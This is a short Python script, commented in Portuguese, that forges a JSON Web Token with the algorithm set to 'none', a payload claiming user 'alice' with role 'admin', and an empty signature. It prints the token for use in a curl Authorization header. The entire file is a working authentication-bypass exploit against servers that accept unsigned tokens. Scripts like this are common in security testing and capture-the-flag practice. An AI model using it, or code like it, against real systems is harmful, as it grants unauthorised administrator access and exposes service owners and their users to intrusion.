#!/usr/bin/env python3
"""
Forja um token JWT com alg=none e role=admin, sem assinatura nenhuma.
Imprime o token pronto pra usar em `curl -H "Authorization: Bearer $(...)"`.
"""
import base64
import json


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


header = {"alg": "none", "typ": "JWT"}
payload = {"user": "alice", "role": "admin"}

header_b64 = b64url_encode(json.dumps(header).encode("utf-8"))
payload_b64 = b64url_encode(json.dumps(payload).encode("utf-8"))

# alg=none => sem assinatura, o token termina em ponto vazio
token = f"{header_b64}.{payload_b64}."
print(token)
